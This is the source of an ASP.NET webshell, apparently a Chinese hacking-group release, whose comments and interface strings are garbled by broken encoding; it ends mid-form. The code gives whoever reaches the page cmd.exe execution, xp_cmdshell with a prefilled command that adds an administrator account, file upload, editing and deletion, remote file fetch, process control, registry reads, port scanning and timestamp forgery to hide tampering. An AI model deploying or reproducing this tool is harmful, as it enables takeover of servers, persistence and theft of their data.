<%@ Page Language="C#" ContentType="text/html"  validateRequest="false" aspcompat="true"%>
<%@ Import Namespace="System.IO" %>
<%@ import namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.Win32" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
//-------------------------------Code by Char--------------------------------
//---------------------------------------------------------------
//-----------------------���Ӱ�ȫ��ר��ASP.NETľ��V1.1	---------------------
//--------------------------��лͬ��DoDo�ṩ����-----------------------------
//---------------------------���Ӱ�ȫ�� ������Ʒ-----------------------------
//---------------------�������ڷǷ�,һ�к���뱾���޹�-----------------------
//-------------------0x0F's Email Wantusirui#Foxmail.com---------------------
//-------------------Char's Email:Hackexp#126.com----------------------------%>
<style>
body,td,.p1,.p2,.i{font-family:arial}
body{margin:0;padding:6px 0 0 0;background-color:#fff;color:#000;position:relative}
input{padding-top:0;padding-bottom:0;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box;}
table{border:0}
TD{FONT-SIZE:8pt;LINE-HEIGHT:18px;}
em{font-style:normal;color:#cc0000}
a em{text-decoration:underline;}
.f14{FONT-SIZE:14px}
.f10{font-size:10.5pt}
.f16{font-size:16px;font-family:Arial}
.c{color:#7777CC;}
.p1{LINE-HEIGHT:120%;margin-left:-12pt}
.p2{width:100%;LINE-HEIGHT:120%;margin-left:-12pt}
.i{font-size:16px;line-height:1.4em;height:28px;*height:24px}
.t{COLOR:#0000cc;TEXT-DECORATION:none}
a.t:hover{TEXT-DECORATION:underline}
.p{padding-left:18px;margin:0 0 20px 0;font-size:14px;word-spacing:4px;}
.f{line-height:115%;*line-height:120%;font-size:100%;width:33.7em;padding-left:15px;word-break:break-all;word-wrap:break-word;}
.h{margin-left:8px;width:100%}
.s{width:8%;padding-left:10px; height:25px;}
.m,a.m:link{COLOR:#666;font-size:100%;}
a.m:visited{COLOR:#660066;}
.g{color:#008000; font-size:12px;}
.r{ word-break:break-all;cursor:hand;width:238px;}
.bi {background-color:#D9E1F7;height:20px;margin-bottom:12px}
.pl{padding-left:3px;height:8px;padding-right:2px;font-size:14px;}
.Tit{height:21px; font-size:14px;position:relative; z-index:200}
.Tit a{color:#0000cc}
.fB{ font-weight:bold;}
.mo,a.mo:link,a.mo:visited{COLOR:#666666;font-size:100%;line-height:10px;}
.htb{margin-bottom:5px;}
#ft{clear:both;line-height:20px;background:#e6e6e6;text-align:center}
#ft,#ft *{color:#77C;font-size:12px;font-family:Arial}
#ft span{color:#666}
form{margin:0;position:relative;z-index:9}
.jc a{color:#cc0000}
.btn{font-size:14px;height:2em;*padding-top:2px;width:5.6em;margin-left:3px}
.i,.btn{vertical-align:middle;*vertical-align:baseline}
a font[size="2"] font, font[size="3"] a font { text-decoration: underline}
#tb_mr{color:#0000cc;cursor:pointer;position:relative;z-index:200;}
#tb_mr b{font-weight:normal;text-decoration:underline;}
#tb_mr small{font-size:11px;}
#more{position:absolute;z-index:200;left:314px;top:21px;*top:22px;height:100px;width:58px;border:1px solid #9A99FF;background:#FFF;overflow:hidden;display:none;outline:none;font-size:14px;}
#more a{display:block;height:25%;line-height:24px;padding:0 0 0 7px;width:4em;color:#0001CF;text-decoration:none;}
#more a span{ font-family:"����"}
#more a:hover{background:#D9E1F6;}
#more div{height:1px;overflow:hidden;background:#CCCCFF;margin:0 3px;}
#out{_margin-left:880px;_zoom:1}
#in{_position:relative;_float:left;_margin-left:-880px;}
#wrapper{min-width:880px;_zoom:1;}
#sx{color:#00C;text-decoration:underline;cursor:pointer;}
#u{font-size:12px;text-align:right;margin:0;white-space:nowrap;position:absolute;right:10px;top:6px;_top:0;z-index:210}




.result{width:34em;table-layout:fixed}
</style>
<font size="3"><script runat="server">

     public string PWD ="yhsafe1";  //���������������������!!!

    string GetParentDir(string subdir)
    {
        string holepath = subdir;
        char[] separator = { '\\' };
        String[] patharray = new String[20];
        patharray = holepath.Split(separator);
        string parentdir="";
        int arraynum=0;
        for (arraynum = 0; arraynum < (patharray.Length-2);arraynum++ )
        {
            if (patharray[arraynum] != null)
            {
                parentdir += patharray[arraynum] + "\\";
            }
        }
        //parentdir += patharray[patharray.Length - 2];
        return parentdir;
    }

    string GetWebName()
    { 
        string holepath = Request.CurrentExecutionFilePath;
        char[] separator = { '/' };
        String[] patharray = new String[20];
        patharray = holepath.Split(separator);
        return patharray[(patharray.Length-1)];
    }

    void listprocess()
    {
        Process[] process = Process.GetProcesses();
        foreach (Process allprocess in process)
        {
            ListBoxPro.Items.Add(allprocess.ProcessName);
        }
        string ProcessNum = ListBoxPro.Items.Count.ToString();
        LbNum.Text = ProcessNum + "��";
    }
    void DownFile(string src)
    {
        string pathfile = src;  //pathfile Ҫ���ص��ļ�����
        FileInfo file = new FileInfo(pathfile);
        Response.Clear();
        Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncode(file.Name));
        Response.AddHeader("Content-Length", file.Length.ToString());
        Response.ContentType = "application/octet-stream";
        Response.WriteFile(file.FullName);
        Response.End();
    }
    
    void GetDir(string Url,string file_name)
    {
        Response.Write("<table align =\"center\">");
        Response.Write("<tr>");
        Response.Write("<td>�ļ���</td>");
        Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
        Response.Write("<td>��С</td>");
        Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
        Response.Write("<td>�޸�ʱ��</td>");
        Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
        Response.Write("<td>����</td>");
        Response.Write("</tr>");

        DirectoryInfo dir = new DirectoryInfo(Url);
        if (dir == null)
            return;
        try
        {
            DirectoryInfo[] dirs = dir.GetDirectories();
            Response.Write("<tr>");
            Response.Write("<a href='?page=index&src=" +Server.UrlEncode(GetParentDir(file_name)));
            Response.Write("'>/*����һ��Ŀ¼*/</a>");
            Response.Write("\r\n");
            Response.Write("</tr>");

            foreach (DirectoryInfo file in dirs)
            {
                Response.Write("<tr>");
                Response.Write("<td>");

                Response.Write("<a href='?page=index&src="+Server.UrlEncode(file_name)+Server.UrlEncode(file.Name.ToString())+"\\'>"+file.Name.ToString()+"</a>");
                Response.Write("</td>");
                Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
                Response.Write("<td>");
                Response.Write("<Ŀ¼>");
                Response.Write("</td>");
                Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
                Response.Write("<td>");
                string time = File.GetCreationTime(file_name+file.Name.ToString()).ToString();
                Response.Write(time);
                Response.Write("</td>");
                Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
                Response.Write("<td>");

                Response.Write("<a href='?action=del&src=");
                Response.Write(Server.UrlEncode(file_name) + "\\" + Server.UrlEncode(file.Name.ToString()));
                Response.Write("'onClick='return del(this);'>Del</a>");
                Response.Write("</td>");
                Response.Write("</tr>");
            }
      
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo filed in files)
            {
                Response.Write("<tr>");
                Response.Write("<td>");
                Response.Write(filed.Name.ToString());
                Response.Write("</td>");
                Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
                Response.Write("<td>");
                string size = file_name + "\\" + filed.Name.ToString();
                FileInfo info = new FileInfo(size);
                Response.Write(info.Length.ToString() + "�ֽ�");
                Response.Write("</td>");
                Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
                Response.Write("<td>");
                string time = File.GetCreationTime(file_name + "\\" + filed.Name.ToString()).ToString();
                Response.Write(time);
                Response.Write("</td>");
                Response.Write("<td>&nbsp&nbsp&nbsp&nbsp</td>");
                Response.Write("<td>");
                Response.Write("<a href='?action=edit&src=");
                Response.Write(Server.UrlEncode(file_name) + "\\" + Server.UrlEncode(filed.Name.ToString()));
                Response.Write("'>Edit</a>");
                Response.Write("&nbsp&nbsp&nbsp");
                Response.Write("<a href='?action=copy&src=");
                Response.Write(Server.UrlEncode(file_name) + "\\" +Server.UrlEncode(filed.Name.ToString()));
                Response.Write("'>Copy</a>");
                Response.Write("&nbsp&nbsp&nbsp");
                Response.Write("<a href='?action=deldir&src=");
                Response.Write(Server.UrlEncode(file_name) + "\\" + Server.UrlEncode(filed.Name.ToString()));
                Response.Write("'onClick='return del(this);'>Del</a>");
                Response.Write("&nbsp&nbsp&nbsp");
                Response.Write("<a href='?action=down&src=");
                Response.Write(Server.UrlEncode(file_name) + "\\" +Server.UrlEncode(filed.Name.ToString()));
                Response.Write("'onClick='return down(this);'>Down</a>");
                Response.Write("&nbsp&nbsp&nbsp");
                Response.Write("<a href='?action=rename&src=");
                Response.Write(Server.UrlEncode(file_name) + "\\" + Server.UrlEncode(filed.Name.ToString()));
                Response.Write("'>Rename</a>");
                Response.Write("</td>");
                Response.Write("</tr>");
            }
        }
        catch (Exception)
        {
            Response.Write("�����ڻ���ʱ��ܾ�!");
            return;
        }
        Response.Write("</table>");
        
    }
    
</script>
<%  
    string page = Request.QueryString["page"];
    string action = Request.QueryString["action"];
    string src = Request.QueryString["src"];
%>

<script language="javascript">
    function del()
    {
        if (confirm("���,��Ҫɾ��?�����!!")) { return true; }
        else { return false; }
    }
</script>
<script language="javascript">
    function down()
    {
        if (confirm("��������ص��ļ�����20M\n���鲻Ҫ�ô˷�ʽ����\n����Խ����ļ������ļ���webĿ¼��,ʹ��HTTP����\n�㻹��ȷ���ô˷�ʽ������?")){ return true;}
        else{ return false; }
    }
</script>
<%
    if (action == "del")
    {
        Directory.Delete(src,true);
        string webname = GetWebName();
        Response.Redirect(webname + "?page=index&src="+GetParentDir(src));////
    }
    if (action == "deldir")
    {
        FileInfo fl = new FileInfo(src);
        fl.Delete();
        string webname = GetWebName();
        Response.Redirect(GetParentDir(webname + "?page=index&src=" + src));
    }
     %>  
      <%

    if (Session["root"] != null)
    {
    
       %>
    <table align='center'>
    <tr>
        <td><font color="red">����:</td>
        <td>
        <%
            Response.Write("<a href='?page=index&src=" + Server.MapPath(".") + "\\'><font color='#009900'>WebshellĿ¼</a>");
         %>
         </td>
        <td><a href='?page=info'>������Ϣ</a></td>
        <td><a href='?page=process'>���̹���</a></td>
        <td><a href='?page=newfile'>�½��ļ�</a></td>
        <td><a href='?page=newdir'>�½�Ŀ¼</a></td>
        <td><a href='?page=upload'>�ļ��ϴ�</a></td>
        <td><a href='?page=reg'>ע����ȡ</a></td>
        <td><a href='?page=cmd'>cmdִ��</a></td>
        <td><a href='?page=sql'>sqlִ��</a></td>
        <td><a href='?page=scan'>�˿�ɨ��</a></td>
        <td><a href='?page=clonetime'>��¡ʱ��</a></td>
        <td><a href='?page=download'>Զ���ļ�����</a></td>
        <td><a href='?page=logout'>�ǳ�</a></td>
    </tr>
    <tr>
        <td colspan=14><hr></td>
    </tr>
    <table align ="center">
    <tr>
    <td><font color="red">��ȨĿ¼:&nbsp&nbsp&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Program Files\'>Program Files</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Documents and Settings\All Users\Documents\'>Documents</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\'>PcAnywhere</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Documents and Settings\All Users\����ʼ���˵�\����\'>��ʼ�˵�</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Documents and Settings\All Users\'>All Users</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Program Files\serv-u\'>Serv-uĿ¼I</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Program Files\RhinoSoft.com\'>Serv-uĿ¼II</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Program Files\Real\'>Real</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\Program Files\Microsoft SQL Server\'>Sql Server</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\WINDOWS\system32\config\'>Config</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\WINDOWS\system32\inetsrv\data\'>Data</a>&nbsp&nbsp</td>
                    <td><a href='?page=index&src=C:\windows\Temp\'>Temp</a>&nbsp&nbsp&nbsp</td>
    </tr>
        <tr>
        <td colspan=13><hr></td>
    </tr>
    </table>
    <table align ="center">
    <tr>
    <td>
    <font color="red">�̷����:
<% 
    String[] drives = Environment.GetLogicalDrives();
    for (int i = 0; i < drives.Length; i++)
    {
        Response.Write("<a  href ='"+ GetWebName() +"?page=index&src="+drives[i]+"'>"+ drives[i]+"</a>" + "&nbsp&nbsp&nbsp&nbsp");
    }

%>
    </td>
       </tr>
    </table> 
    
    <table align = "center">

 <font color = "red"> ��ǰ·��:
  
    <%
        if (src == null)
        {
            Response.Write(Server.MapPath(".")+"\\");
        }
        else
            Response.Write(src);
            
        %>

</table>
    <hr>
<%
    
    if ((page == "info") && (Session["root"] != null))
    {
        this.LbServerNameC.Text = Server.MachineName;
        this.LbLangC.Text = Request.UserLanguages[0];
        this.LbIpC.Text = Request.UserHostAddress;
        this.LbBrowerC.Text = Request.UserAgent;
        this.LbDnsC.Text = Request.UserHostName;
        this.LbUrlC.Text = Server.MapPath(".");
        this.LbUrlXdC.Text = Request.Path;
        this.LbTimeC.Text = DateTime.Now.ToString();
        this.Lbversionc.Text = Environment.Version.ToString();
        this.LbUserc.Text = Environment.UserName;
        this.LbBBC.Text = Environment.OSVersion.ToString();
%>    
<table align='center'>   
    <tr>
        <td colspan="10">
            <asp:Label ID="LbServerName" runat="server" Text="�������:"></asp:Label>
            <asp:Label ID="LbServerNameC" runat="server" BorderStyle="None"></asp:Label></br>
            <asp:Label ID="LbLang" runat="server" Text="���������:"></asp:Label>
            <asp:Label ID="LbLangC" runat="server"></asp:Label></br>
            <asp:Label ID="LbIp" runat="server" Text="�����IP:"></asp:Label>
            <asp:Label ID="LbIpC" runat="server"></asp:Label></br>
            <asp:Label ID="LbUser" runat="server" Text="��ǰ�û�:"></asp:Label>
            <asp:Label ID="LbUserc" runat="server"></asp:Label></br>
            <asp:Label ID="LbBB" runat="server" Text="�������汾:"></asp:Label>
            <asp:Label ID="LbBBC" runat="server"></asp:Label></br>
            <asp:Label ID="LbDns" runat="server" Text="DNS:"></asp:Label>
            <asp:Label ID="LbDnsC" runat="server"></asp:Label></br>
            <asp:Label ID="LbTime" runat="server" Text="�����ʱ��:"></asp:Label>
            <asp:Label ID="LbTimeC" runat="server"></asp:Label></br>
            <asp:Label ID="LbBrower" runat="server" Text="�������Ϣ:"></asp:Label>
            <asp:Label ID="LbBrowerC" runat="server"></asp:Label></br>
            <asp:Label ID="LbUrl" runat="server" Text="���ļ����ھ���·��:"></asp:Label>
            <asp:Label ID="LbUrlC" runat="server"></asp:Label></br>
            <asp:Label ID="LbUrlXd" runat="server" Text="���ļ��������·��:"></asp:Label>
            <asp:Label ID="LbUrlXdC" runat="server"></asp:Label></br>
            <asp:Label ID="Lbversion" runat="server" Text=".NET�汾:"></asp:Label>
            <asp:Label ID="Lbversionc" runat="server"></asp:Label></br>

        </td>
</tr>
            </table>
  
<%
    }
    else if ((page == "reg") && (Session["root"] != null))
    {
 %>   
        <table align='center'>
        <form id="Form2" runat="server">
        <asp:Label ID="LbRegUrlA" runat="server" Text="������Ҫ��ȡ�ļ�ֵע���·��:"></asp:Label>
        <asp:Label ID="LbRegC" runat="server" Text="�����"></asp:Label><br />
        <asp:TextBox ID="TextBoxReg" runat="server" Width="551px">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\Wds\rdpwd\Tds\tcp</asp:TextBox>
        <asp:TextBox ID="TextBoxB" runat="server" Width="76px">PortNumber</asp:TextBox></br>
        <asp:Button ID="ButtonReg" runat="server" OnClick="ButtonReg_Click" Text="Regedit" />
        <asp:Label ID="Label1" runat="server" Text="����ȡ��ֵΪ:"></asp:Label>
        <asp:Label ID="LbReg" runat="server" Width="319px"></asp:Label>
        </form>
        </table>
        
        <script runat="server">
            
                 protected void ButtonReg_Click(object sender, EventArgs e)
                {
                    try
                    {

            string regvalue = TextBoxReg.Text;
            string val = TextBoxB.Text;
            string vals = "��ֵ������Ŷ";

            char[] separator = { '\\' };
            String[] patharray = new String[80];
            patharray = regvalue.Split(separator);

            string lastvalue="";
 
            for (int i = 1; i < patharray.Length; i++)
            {
                lastvalue = lastvalue + patharray[i] + "\\";
            }
           
                switch(patharray[0])
                {
                    case "HKEY_LOCAL_MACHINE":
                        RegistryKey reg = Registry.LocalMachine.OpenSubKey(lastvalue);
                        LbReg.Text = reg.GetValue(val, "null").ToString();
                        break;
                    case "HKEY_CLASSES_ROOT":
                        RegistryKey rega = Registry.ClassesRoot.OpenSubKey(lastvalue);
                        LbReg.Text = rega.GetValue(val, "null").ToString();
                        break;
                    case "HKEY_CURRENT_USER":
                        RegistryKey regb = Registry.CurrentUser.OpenSubKey(lastvalue);
                        LbReg.Text = regb.GetValue(val, "null").ToString();
                        break;
                    case "HKEY_USERS":
                        RegistryKey regc = Registry.Users.OpenSubKey(lastvalue);
                        LbReg.Text = regc.GetValue(val, "null").ToString();
                        break;
                    case "HKEY_CURRENT_CONFIG":
                        RegistryKey regd = Registry.CurrentConfig.OpenSubKey(lastvalue);
                        LbReg.Text = regd.GetValue(val, "null").ToString();
                        break;
                    default:
                        LbReg.Text = val;
                        break;
                    
                }
              

            }
            catch (Exception)
            {
                Response.Write("������ʲô�ط��������?����ע��������?");
            }
        }
            
            </script>
        
<%
    }
        else if ((page == "upload") && (Session["root"] != null))
    {
%>

        <table align="center">
        <form id="Form1" method="post" encType="multipart/form-data" runat="server">
   ����·��:<asp:TextBox ID="TextBoxSaveUpUrl" runat="server" Width="417px"></asp:TextBox><br />
 <input name="upfile" type="file" class="TextBox" id="UpFile" runat="server"��style="width: 447px">
        <asp:Button ID="ButtonFuckUp" runat="server" OnClick="ButtonFuckUp_Click" Text="�ϴ�" Width="57px" /><br />
        </form>
        </table>
                <script runat="server">
            protected void ButtonFuckUp_Click(object sender, EventArgs e)
            {
                string upload = TextBoxSaveUpUrl.Text;
                UpFile.PostedFile.SaveAs(upload);
            }
    
        </script>

<%
        }
    else if ((page == "cmd") && (Session["root"] != null))
    {
%>
        <table align='center'>
        <form id="Form3" runat="server">
        <asp:Label ID="LbDos" runat="server" Text="DOS����:"></asp:Label>
        <asp:TextBox ID="TextBoxDos" runat="server" Width="499px">net user</asp:TextBox>
        <asp:Button ID="ButtonDos" runat="server" OnClick="ButtonCmd_Click" Text="CMD" /></br>
        <asp:TextBox ID="TextBoxDosC" runat="server" Height="300px" Width="570px" BorderStyle="Dotted" TextMode="MultiLine"></asp:TextBox>
        </form>
        </table>
        <script runat="server">
            protected void ButtonCmd_Click(object sender, EventArgs e)
            {
                TextBoxDosC.Text = "";
                Process myprocess = new Process();
                ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo("cmd.exe");
                MyProcessStartInfo.UseShellExecute = false;
                MyProcessStartInfo.RedirectStandardOutput = true;
                myprocess.StartInfo = MyProcessStartInfo;
                MyProcessStartInfo.Arguments = "/c" + TextBoxDos.Text;
                myprocess.Start();
                StreamReader mystream = myprocess.StandardOutput;
                TextBoxDosC.Text = mystream.ReadToEnd();
                mystream.Close();
            }
            </script>
    
<%    
    }
    else if ((page == "sql") && (Session["root"] != null))
    {
%>
        <table align='center'>
        <form id="Form4" runat="server">
        <asp:Label ID="LbSqlA" runat="server" Text="Sql Host:"></asp:Label>
        <asp:TextBox ID="TextBoxSqlA" runat="server" Width="410px">.</asp:TextBox></br>
        <asp:Label ID="LbSqlB" runat="server" Text="Sql UserName:"></asp:Label>
        <asp:TextBox ID="TextBoxSqlB" runat="server" >sa</asp:TextBox>
        <asp:Label ID="LbSqlC" runat="server" Text="Sql Pwd:"></asp:Label>
        <asp:TextBox ID="TextBoxSqlC" runat="server">sa</asp:TextBox>
        <asp:Button ID="ButtonSqlCon" runat="server" Text="����" Width="51px" OnClick="ButtonSqlCon_Click" /></br>
        <asp:Label ID="LbSqlD" runat="server" Text="Command:" Width="42px"></asp:Label>
        <asp:TextBox ID="TextBoxSqlCon" runat="server" Width="400px" >net user char char /add &amp; net localgroup administrators char /add</asp:TextBox>
        <asp:Button ID="ButtonSqlCmd" runat="server" Text="ִ��" Width="52px" OnClick="ButtonSqlCmd_Click" /></br>
        <asp:TextBox ID="TextBoxSqlCmd" runat="server" Height="106px" Width="470px"></asp:TextBox>
        </form>
        </table>
        <script runat="server">
                protected void ButtonSqlCon_Click(object sender, EventArgs e)
                {
                     try
                    {
                        SqlConnection mycon = new SqlConnection();
                        mycon.ConnectionString = "Persist Security Info = False;User id =" + TextBoxSqlB.Text + ";pwd=" + TextBoxSqlC.Text + ";server=" + TextBoxSqlA.Text;
                        mycon.Open();
                        mycon.Close();
                        Response.Write("��ϲ��,���Ӳ��Գɹ�!");
                        }
                        catch (Exception)
                        {
                        Response.Write("�����˻�����,���Ӳ���ʧ��!");
                    }
                }

            protected void ButtonSqlCmd_Click(object sender, EventArgs e)
            {
                try
                {
                    SqlConnection mycon = new SqlConnection();
                    mycon.ConnectionString = "Persist Security Info = False;User id =" + TextBoxSqlB.Text + ";pwd=" + TextBoxSqlC.Text + ";server=" + TextBoxSqlA.Text;
                    mycon.Open();
                    SqlCommand cmd = new SqlCommand();
                    cmd.Connection = mycon;
                    cmd.CommandText = "exec master..xp_cmdshell '" + TextBoxSqlCon.Text + "'";
                    cmd.ExecuteNonQuery();

                    TextBoxSqlCmd.Text = "����ɹ�ִ��!";
                    mycon.Close();
                }
                catch (Exception)
                {
                    TextBoxSqlCmd.Text = "����ִ��ʧ��!";
                }

            }
            
        </script>

<% 
    }
    else if ((page == "scan") && (Session["root"] != null))
    {
%>
        <table align='center'>
        <form id="Form5" runat="server">
      IP:<asp:TextBox ID="TextBoxScanIP" runat="server" Width="238px">127.0.0.1</asp:TextBox>
      port(��˿����ö��Ÿ���)<asp:TextBox ID="TextBoxScanPort" runat="server" Width="238px">21,1433,3389</asp:TextBox>
        <asp:Button ID="ButtonScan" runat="server" OnClick="ButtonScan_Click" Text="ɨ��" Width="51px" /><br />
        <asp:Label ID="LbScan" runat="server" Width="666px"></asp:Label>
        </form>
        </table>
        <script runat="server">
            protected void ButtonScan_Click(object sender, EventArgs e)
    {
        LbScan.Text = "";
        TcpClient client = new TcpClient();
        string allport = TextBoxScanPort.Text;
        char[] separator = { ',' };
        String[] portarray = new String[20];
        portarray = allport.Split(separator);
        int portnum = 0;
        while (portnum < portarray.Length)
        {
            IPAddress address = IPAddress.Parse(TextBoxScanIP.Text);
            int i = int.Parse(portarray[portnum]);
            try
            {
                client.Connect(address, i);
                LbScan.Text +=""+i.ToString()+"<font>�˿��ӾͿ�����!</br>";
                client.Close();
            }
            catch (SocketException)
            {
                LbScan.Text += i + "�˿���û����!<br>";
            }
            portnum++;
        }
        client.Close();
    }
        </script>

<%
    }

%>

<%
    else if (page == "logout")
    {
        Session["root"] = null;
        Response.Redirect(GetWebName());
        %>

<%
    }
    else if ((page == "clonetime") && (Session["root"] != null))
    { 
            
%>      <table align='center'>
        <form id="Form6" runat="server">
        Ҫ��¡���ļ�:<asp:TextBox ID="TextBoxWant" runat="server" Width="270px"></asp:TextBox></br>
        ����¡���ļ�:<asp:TextBox ID="TextBoxTo" runat="server" Width="270px"></asp:TextBox>
        <asp:Button ID="Button_Clone" runat="server" OnClick="ButtonClone_Click" Text="��¡" Width="48px" />
        </form>
        <table>
        
        <script runat="server">
            protected void ButtonClone_Click(object sender, EventArgs e)
            {
                    FileInfo filewant = new FileInfo(TextBoxWant.Text.ToString());
                    FileInfo filego = new FileInfo(TextBoxTo.Text.ToString());
                    filewant.LastWriteTime = filego.LastWriteTime;
                    filewant.LastAccessTime = filego.LastAccessTime;
                    filewant.CreationTime = filego.CreationTime;
                    Response.Write("Clone time success!");
            }
        </script>
<%
    }
    else if ((page == "download") && (Session["root"] != null))
    {
%>
        <table align='center'>
        <form id="Form7" runat="server">
        ���ص�ַ:<asp:TextBox ID="TextBoxDurl" runat="server"  Width="270px">http://www.baidu.com/img/logo.gif</asp:TextBox></br>
        ����·��:<asp:TextBox ID="TextBoxDfile" runat="server"  Width="270px">c:\logo.gif</asp:TextBox>
        <asp:Button ID="ButtonDown" runat="server" OnClick="ButtonDown_Click" Text="����" />
        </form>
        </table>
        <script runat="server">
            protected void ButtonDown_Click(object sender, EventArgs e)
            {
                string url = TextBoxDurl.Text.ToString();
                string file = TextBoxDfile.Text.ToString();
                WebClient wc = new WebClient();
                Stream str = wc.OpenRead(url);
                byte[] bytes = new byte[1024];
                int len = 0;
                FileStream fs = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Write);
                while ((len = str.Read(bytes, 0, 1024)) != 0)
                {
                    fs.Write(bytes, 0, len);
                }
                fs.Close();
            }
        </script>
<%
    }
    else if ((page == "newdir") && (Session["root"] != null))
    {   
%>
        <table align='center'>
        <form id="Form8" runat="server">
        ����·�����ļ�������:<asp:TextBox ID="TextBoxNewDir" runat="server" Width="368px"></asp:TextBox>
        <asp:Button ID="ButtonNewDir" runat="server" OnClick="ButtonNewDir_Click" Text="����Ŀ¼" /><br />
        </form>
        </table>
        <script runat="server">
            protected void ButtonNewDir_Click(object sender, EventArgs e)
            {
                Directory.CreateDirectory(TextBoxNewDir.Text.ToString());
                Response.Write("Ŀ¼�����ɹ�!");
            }
        </script>
<%    
    }
    else if ((page == "index") && Session["root"] != null)
    {
%>
        
        <%
    if (src == "")
    {
        Response.Write("���Ѿ��޷������ϲ�Ŀ¼��,��������,лл!");
    }
    else
        GetDir(src, src);
         %>

<%
    }
    else if ((page == "process") && Session["root"] != null)
    {
        ListBoxPro.Items.Clear();
        listprocess();
%>
                <form id="Form11" runat="server">
        <table align = "center">
   
        <tr>
        <td><font color ="red">�ɴ�����ִ��ָ��������(Ȩ������):<br>
                <font color ="red">ִ�г���(����·��):<asp:TextBox ID="TextBoxExe" runat="server" Width="200px"></asp:TextBox><br>
        <font color ="red">����(����,�ɲ�д):
        <asp:TextBox ID="TextBoxExeC" runat="server" Width="208px"></asp:TextBox>
        <asp:Button ID="ButtonExe" runat="server" OnClick="ButtonExe_Click" Text="ִ��" Width="44px" /></p>
        <td>
        </tr>
        </table>

        <table align="center">
        <tr>
                <font color="red"> ��ǰ����:
        <td>


        <asp:ListBox ID="ListBoxPro" runat="server" Height="300px" Width="300px"></asp:ListBox><br />
        �ܽ�����:<asp:Label ID="LbNum" runat="server"></asp:Label><br />
        <asp:Button ID="ButtonProDel" runat="server" OnClick="ButtonProDel_Click" Text="ѡ�С�ɾ��" Width="70px" />
        &nbsp;&nbsp;
        <asp:Button ID="ButtonProClear" runat="server" OnClick="ButtonProClear_Click" Text="ˢ��" Width="51px" />
        </form>
        </td>
        </tr>
        </table>
       <script runat="server">
           protected void ButtonExe_Click(object sender, EventArgs e)
           {
               Process exe = new Process();
               exe.StartInfo.FileName = TextBoxExe.Text.ToString();
               exe.StartInfo.Arguments = TextBoxExeC.Text.ToString();
               exe.Start();
           }
           
           protected void ButtonProDel_Click(object sender, EventArgs e)
            {

                Process[] killprocess = Process.GetProcesses();
                try
                {
                    foreach (Process kill in killprocess)
                    {
                        string processname = ListBoxPro.SelectedValue.ToString();
                        if (processname == kill.ProcessName)
                            kill.Kill();
                    }
                    Response.Write("ɾ���ɹ�,��ˢ��֮!������ɹ�,���ˢ�¼�������!");
                }
                catch (Exception wrong)
                {
                    Response.Write("ϵͳ����:" + wrong+"<br>");
                    Response.Write("�����ϵͳ������ʾ,����ˢ��һ���ٳ���ɾ��!!!");
                }

            }
            protected void ButtonProClear_Click(object sender, EventArgs e)
            {
                ListBoxPro.Items.Clear();
                listprocess();
            }
       </script>

<%
    }
    else if ((page == "newfile") && (Session["root"] != null))
    {
%>
        <table align ="center">
        <form runat="server">
        <asp:TextBox ID="TextBoxNewfile" runat="server" Width="477px" >c:\char.txt</asp:TextBox>
        <asp:Button ID="ButtonNewfile" runat="server" OnClick="ButtonNewfile_Click" Text="����" Width="57px" /><br />
        <br />
        <asp:TextBox ID="TextBoxNewfiles" runat="server" Height="324px"  TextMode="MultiLine" Width="537px" ></asp:TextBox><br />
        </form>
        </table>
        
        <script runat="server">
            protected void ButtonNewfile_Click(object sender, EventArgs e)
            {
                StreamWriter sw = new StreamWriter(TextBoxNewfile.Text.ToString(),false,Encoding.Default);
                sw.Write(TextBoxNewfiles.Text.ToString());
                sw.Close();
            }
        </script>
<%        
    }
    else if ((action == "edit") && (Session["root"] != null))
    {
    %>
            <%
    TextBoxReadDir.Text = src;

    StreamReader sr = new StreamReader(TextBoxReadDir.Text.ToString(), Encoding.Default);
    TextBoxFileContent.Text = sr.ReadToEnd();
    sr.Close();
         %>
        <table align='center'>
        <form runat="server">
         <asp:TextBox ID="TextBoxReadDir" runat="server" Width="477px" ></asp:TextBox>
        <asp:Button ID="ButtonSave" runat="server" OnClick="ButtonSave_Click" Text="����" Width="57px" /><br />
        <br />
        <asp:TextBox ID="TextBoxFileContent" runat="server" Height="324px" TextMode="MultiLine" Width="537px" ></asp:TextBox><br />
        <br />
        </form>
        <table>

        <script runat="server">
            protected void ButtonSave_Click(object sender, EventArgs e)
            {
                StreamWriter sw = new StreamWriter(TextBoxReadDir.Text.ToString(),false,Encoding.Default);
                sw.Write(TextBoxFileContent.Text.ToString());
                sw.Close();
            }
        </script>
    
    <%
    }
    else if (action == "rename" && Session["root"] != null)
    {
        TextBoxRename.Text = src;
        TextBoxRenameTo.Text = src;
    %>
        <table align ="center">
        <form runat="server">
